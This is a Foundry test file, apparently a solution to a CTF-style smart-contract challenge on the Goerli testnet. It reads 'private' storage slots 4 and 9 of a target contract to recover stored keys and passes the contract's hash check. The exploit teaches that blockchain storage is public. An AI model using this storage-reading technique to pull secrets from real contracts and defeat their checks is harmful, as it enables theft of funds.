// SPDX-License-Identifier: MIT
pragma solidity ^0.8.7;

import "forge-std/Test.sol";

contract ConfidentialAttack is Test {
    IConfidential confidential;

    function setUp() external {
        vm.createSelectFork("goerli"); 
        confidential = IConfidential(0xf8E9327E38Ceb39B1Ec3D26F5Fad09E426888E66);
    }

    function test_Confidential() public {
        //get 4th slot
        bytes32 alicePrivateKey = vm.load(address(confidential), bytes32(uint256(4)));
        //get 9th slot
        bytes32 bobPrivateKey = vm.load(address(confidential), bytes32(uint256(9)));
        //combine to get hash of alice and bob private keys
        bytes32 result = confidential.hash(alicePrivateKey, bobPrivateKey);
        assertEq(confidential.checkthehash(result), true);
    }
}

interface IConfidential {
    function checkthehash(bytes32) external view returns(bool);
    function hash(bytes32, bytes32) external pure returns (bytes32);
}